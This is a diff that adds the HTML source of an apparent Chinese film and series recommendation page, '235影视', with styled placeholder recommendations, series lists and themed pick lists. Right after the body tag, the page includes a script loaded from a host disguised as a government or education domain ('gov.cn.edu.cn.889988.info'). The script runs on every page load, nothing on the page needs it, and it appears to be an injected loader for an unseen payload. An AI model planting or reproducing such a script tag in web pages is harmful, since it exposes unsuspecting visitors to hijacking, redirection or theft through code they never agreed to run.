@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>235影视 - 电影剧集推荐与片单导航</title>
+<meta name="description" content="235影视(235yingshi-h5.github.io)提供电影、剧集、纪录片推荐与主题片单导航，移动端自适应单页，不提供播放入源，仅做影视资讯整理。">
+<meta name="keywords" content="235影视, 235yingshi, 电影推荐, 剧集导航, 影视片单, 观影指南">
+<style>
+/* ========== 全局 ========== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: "PingFang SC","Microsoft YaHei",sans-serif;
+  background: #11151c;
+  color: #d7dde5;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+a { text-decoration: none; color: inherit; }
+ul { list-style: none; }
+
+/* ========== 栏目1：顶部导航 ========== */
+.topbar {
+  background: #0c0f14;
+  border-bottom: 1px solid #1e2630;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  padding: .7rem 1.2rem;
+}
+.topbar-in {
+  max-width: 1180px;
+  margin: auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.logo {
+  font-size: 1.4rem;
+  font-weight: 900;
+  letter-spacing: 1px;
+  color: #fff;
+}
+.logo b { color: #ff6a1a; }
+.nav-links { display: flex; gap: 1.6rem; }
+.nav-links a {
+  font-size: .88rem;
+  color: #8a97a8;
+  transition: color .25s;
+}
+.nav-links a:hover { color: #ff6a1a; }
+
+/* ========== 栏目2：Hero 首屏 ========== */
+.hero {
+  max-width: 1180px;
+  margin: auto;
+  padding: 4rem 1.2rem 3rem;
+  display: grid;
+  grid-template-columns: 1.2fr .8fr;
+  gap: 2.5rem;
+  align-items: center;
+}
+.hero-left h1 {
+  font-size: 3rem;
+  color: #fff;
+  line-height: 1.15;
+  margin-bottom: 1rem;
+}
+.hero-left h1 b { color: #ff6a1a; font-style: italic; }
+.hero-left p {
+  color: #93a1b3;
+  max-width: 480px;
+  margin-bottom: 2rem;
+}
+.hero-btn {
+  display: inline-block;
+  background: #ff6a1a;
+  color: #11151c;
+  font-weight: 700;
+  padding: .7rem 2rem;
+  border-radius: 6px;
+  transition: .25s;
+}
+.hero-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(255,106,26,.3); }
+/* 右侧数字块 */
+.hero-right {
+  display: grid;
+  grid-template-columns: repeat(2,1fr);
+  gap: 1rem;
+}
+.num-box {
+  background: #161b24;
+  border: 1px solid #232c38;
+  border-radius: 10px;
+  padding: 1.2rem;
+  text-align: center;
+}
+.num-box b {
+  display: block;
+  font-size: 1.8rem;
+  color: #ff6a1a;
+  font-style: italic;
+}
+.num-box span { font-size: .78rem; color: #7e8b9c; }
+
+/* ========== 栏目3：横向滚动推荐轨道 ========== */
+.track-sec { padding: 2.5rem 0 3rem; }
+.sec-head {
+  max-width: 1180px;
+  margin: 0 auto 1.5rem;
+  padding: 0 1.2rem;
+  display: flex;
+  align-items: baseline;
+  gap: 1rem;
+}
+.sec-head h2 { font-size: 1.5rem; color: #fff; }
+.sec-head span { font-size: .78rem; color: #6f7c8d; letter-spacing: 2px; }
+.track {
+  display: flex;
+  gap: 1rem;
+  overflow-x: auto;
+  padding: 0 1.2rem 1rem;
+  scroll-snap-type: x mandatory;
+  -webkit-overflow-scrolling: touch;
+}
+.track::-webkit-scrollbar { height: 6px; }
+.track::-webkit-scrollbar-thumb { background: #2a3441; border-radius: 10px; }
+.track-card {
+  flex: 0 0 260px;
+  scroll-snap-align: start;
+  background: #161b24;
+  border: 1px solid #232c38;
+  border-radius: 12px;
+  overflow: hidden;
+  transition: .25s;
+}
+.track-card:hover { border-color: #ff6a1a; transform: translateY(-4px); }
+.track-cover {
+  height: 140px;
+  background: linear-gradient(135deg,#1d2530,#26323f);
+  display: grid;
+  place-items: center;
+  color: #4d5b6b;
+  font-size: .8rem;
+}
+.track-body { padding: 1rem 1.1rem; }
+.track-body h4 { font-size: 1rem; color: #fff; margin-bottom: .3rem; }
+.track-body .meta { font-size: .76rem; color: #ff6a1a; font-weight: 600; }
+.track-body p { font-size: .82rem; color: #8492a3; margin-top: .4rem; }
+
+/* ========== 栏目4：剧集编号列表 ========== */
+.series-sec {
+  max-width: 1180px;
+  margin: auto;
+  padding: 3rem 1.2rem;
+}
+.series-list { display: grid; gap: 1rem; }
+.series-row {
+  display: grid;
+  grid-template-columns: 48px 1fr auto;
+  gap: 1rem;
+  align-items: center;
+  background: #161b24;
+  border: 1px solid #232c38;
+  border-radius: 10px;
+  padding: .9rem 1.2rem;
+  transition: .25s;
+}
+.series-row:hover { border-color: #ff6a1a; }
+.series-no {
+  font-size: 1.3rem;
+  font-weight: 900;
+  color: #2f3a47;
+  font-style: italic;
+}
+.series-main h4 { font-size: 1.02rem; color: #fff; }
+.series-main p { font-size: .82rem; color: #8492a3; }
+.status {
+  font-size: .72rem;
+  padding: .2rem .7rem;
+  border-radius: 20px;
+  white-space: nowrap;
+}
+.status.on { background: rgba(255,106,26,.12); color: #ff6a1a; }
+.status.wait { background: #1e2630; color: #7e8b9c; }
+.status.end { background: #15321f; color: #5fd98a; }
+
+/* ========== 栏目5：片单两栏 ========== */
+.pian-sec { padding: 3rem 1.2rem; max-width: 1180px; margin: auto; }
+.pian-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; }
+.pian-card {
+  background: #161b24;
+  border: 1px solid #232c38;
+  border-left: 4px solid #ff6a1a;
+  border-radius: 10px;
+  padding: 1.4rem 1.6rem;
+}
+.pian-card h4 { color: #fff; font-size: 1.1rem; margin-bottom: .5rem; }
+.pian-card p { font-size: .86rem; color: #93a1b3; margin-bottom: .6rem; }
+.pian-tags { display: flex; gap: .5rem; flex-wrap: wrap; }
+.pian-tags span {
+  font-size: .74rem;
+  color: #ff6a1a;
+  border: 1px solid #303b48;
+  padding: .15rem .6rem;
+  border-radius: 20px;
+}
+
+/* ========== 栏目6：关于 ========== */
+.about {
+  background: #0c0f14;
+  border-top: 1px solid #1e2630;
+  padding: 3.5rem 1.2rem;
+  text-align: center;
+}
+.about-in { max-width: 680px; margin: auto; }
+.about h2 { color: #fff; font-size: 1.5rem; margin-bottom: 1rem; }
+.about p { color: #8492a3; font-size: .92rem; margin-bottom: .8rem; }
+.about b { color: #ff6a1a; }
+
+/* ========== 页脚 ========== */
+footer {
+  background: #080a0e;
+  color: #5f6b7a;
+  text-align: center;
+  padding: 2.2rem 1rem;
+  font-size: .82rem;
+}
+footer a { color: #ff6a1a; }
+.disclaim {
+  max-width: 680px;
+  margin: .8rem auto 0;
+  font-size: .72rem;
+  color: #3f4855;
+  line-height: 1.6;
+}
+
+/* ========== 移动端 ========== */
+@media (max-width: 768px) {
+  .nav-links { display: none; }
+  .hero { grid-template-columns: 1fr; padding-top: 2.5rem; }
+  .hero-left h1 { font-size: 2.2rem; }
+  .hero-right { grid-template-columns: repeat(2,1fr); }
+  .pian-grid { grid-template-columns: 1fr; }
+  .series-row { grid-template-columns: 36px 1fr; }
+  .series-row .status { grid-column: 2; justify-self: start; margin-top: .3rem; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<div class="topbar">
+  <div class="topbar-in">
+    <div class="logo"><b>235</b>影视</div>
+    <nav class="nav-links">
+      <a href="#">首页</a>
+      <a href="#track">今日推荐</a>
+      <a href="#series">热播剧集</a>
+      <a href="#pian">主题片单</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 首屏 -->
+<section class="hero">
+  <div class="hero-left">
+    <h1><b>235</b> 影视<br>挑片不绕路</h1>
+    <p>235影视（235yingshi-h5.github.io）做电影、剧集、纪录片的推荐与片单导航，按题材和观看节奏整理，不挂播放入源，手机上直接翻。</p>
+    <a href="#track" class="hero-btn">开始逛片</a>
+  </div>
+  <div class="hero-right">
+    <div class="num-box"><b>235</b><span>站点编号</span></div>
+    <div class="num-box"><b>4+</b><span>内容栏目</span></div>
+    <div class="num-box"><b>MV</b><span>移动优先</span></div>
+    <div class="num-box"><b>0</b><span>播放入源</span></div>
+  </div>
+</section>
+
+<!-- 横向轨道推荐 -->
+<section class="track-sec" id="track">
+  <div class="sec-head">
+    <h2>今日推荐</h2>
+    <span>FILM TRACK</span>
+  </div>
+  <div class="track">
+    <div class="track-card">
+      <div class="track-cover">封面位</div>
+      <div class="track-body">
+        <span class="meta">剧情 · 2026</span>
+        <h4>城北旧事</h4>
+        <p>群像叙事，节奏稳，适合晚上慢慢看。</p>
+      </div>
+    </div>
+    <div class="track-card">
+      <div class="track-cover">封面位</div>
+      <div class="track-body">
+        <span class="meta">悬疑 · 短剧</span>
+        <h4>第十三天</h4>
+        <p>单元案结构，单集 15 分钟，午间能刷两集。</p>
+      </div>
+    </div>
+    <div class="track-card">
+      <div class="track-cover">封面位</div>
+      <div class="track-body">
+        <span class="meta">治愈 · 日常</span>
+        <h4>巷口食堂</h4>
+        <p>低冲突、高氛围，配饭场景友好。</p>
+      </div>
+    </div>
+    <div class="track-card">
+      <div class="track-cover">封面位</div>
+      <div class="track-body">
+        <span class="meta">科幻 · 动画</span>
+        <h4>轨道之上</h4>
+        <p>美术风格强，设定不复杂，入门无门槛。</p>
+      </div>
+    </div>
+    <div class="track-card">
+      <div class="track-cover">封面位</div>
+      <div class="track-body">
+        <span class="meta">纪录片</span>
+        <h4>旧厂回声</h4>
+        <p>工业变迁口述史，适合周末连看。</p>
+      </div>
+    </div>
+    <div class="track-card">
+      <div class="track-cover">封面位</div>
+      <div class="track-body">
+        <span class="meta">喜剧 · 轻</span>
+        <h4>加班别call我</h4>
+        <p>职场轻喜剧，笑点密但不吵。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集编号列表 -->
+<section class="series-sec" id="series">
+  <div class="sec-head">
+    <h2>热播剧集</h2>
+    <span>SERIES</span>
+  </div>
+  <div class="series-list">
+    <div class="series-row">
+      <div class="series-no">01</div>
+      <div class="series-main">
+        <h4>长夜邮局</h4>
+        <p>悬疑 / 单元剧 / 每集独立案件</p>
+      </div>
+      <span class="status on">更新中</span>
+    </div>
+    <div class="series-row">
+      <div class="series-no">02</div>
+      <div class="series-main">
+        <h4>南方汽水厂</h4>
+        <p>年代 / 家庭 / 慢节奏叙事</p>
+      </div>
+      <span class="status end">已完结</span>
+    </div>
+    <div class="series-row">
+      <div class="series-no">03</div>
+      <div class="series-main">
+        <h4>代码之外</h4>
+        <p>职场 / 科技 / 轻悬疑线</p>
+      </div>
+      <span class="status on">更新中</span>
+    </div>
+    <div class="series-row">
+      <div class="series-no">04</div>
+      <div class="series-main">
+        <h4>山海小饭桌</h4>
+        <p>治愈 / 美食 / 单元日常</p>
+      </div>
+      <span class="status wait">待更新</span>
+    </div>
+    <div class="series-row">
+      <div class="series-no">05</div>
+      <div class="series-main">
+        <h4>第七次重逢</h4>
+        <p>爱情 / 都市 / 反转中等</p>
+      </div>
+      <span class="status end">已完结</span>
+    </div>
+  </div>
+</section>
+
+<!-- 片单两栏 -->
+<section class="pian-sec" id="pian">
+  <div class="sec-head">
+    <h2>主题片单</h2>
+    <span>PICK LISTS</span>
+  </div>
+  <div class="pian-grid">
+    <div class="pian-card">
+      <h4>下班后别太累</h4>
+      <p>选片逻辑：单集短、冲突低、退出成本低，适合 20 分钟碎片时间。</p>
+      <div class="pian-tags"><span>轻喜剧</span><span>日常</span><span>单元</span></div>
+    </div>
+    <div class="pian-card">
+      <h4>周末连看两部</h4>
+      <p>选片逻辑：剧情完整、节奏中等，适合沙发场景一次看完。</p>
+      <div class="pian-tags"><span>剧情</span><span>悬疑</span><span>电影</span></div>
+    </div>
+    <div class="pian-card">
+      <h4>不费脑配饭</h4>
+      <p>选片逻辑：对白多、画面稳、不烧脑，午饭间隙刚好。</p>
+      <div class="pian-tags"><span>美食</span><span>治愈</span><span>综艺感</span></div>
+    </div>
+    <div class="pian-card">
+      <h4>想认真看一部</h4>
+      <p>选片逻辑：叙事密度高、值得二刷，留一段完整时间再看。</p>
+      <div class="pian-tags"><span>文艺</span><span>历史</span><span>纪录片</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about">
+  <div class="about-in">
+    <h2>关于 235影视</h2>
+    <p>欢迎访问 <b>235影视</b>（https://235yingshi-h5.github.io），本站是静态单页影视推荐导航，核心词：235影视 / 235yingshi / 电影推荐 / 剧集盘点。</p>
+    <p>不提供在线播放入源、不存储视听文件、不聚合第三方资源，仅做内容整理与观看路径导航。</p>
+  </div>
+</section>
+
+<footer>
+  <p>© 2026 235影视 · 235yingshi-h5.github.io</p>
+  <p>网址：<a href="https://235yingshi-h5.github.io">https://235yingshi-h5.github.io</a></p>
+  <p class="disclaim">本页为影视推荐导航示例，不存储视听文件、不提供未授权播放入源；若实际建站涉及互联网视听节目传播，请按属地广电与版权要求办理相应许可。</p>
+</footer>
+
+</body>
+</html>
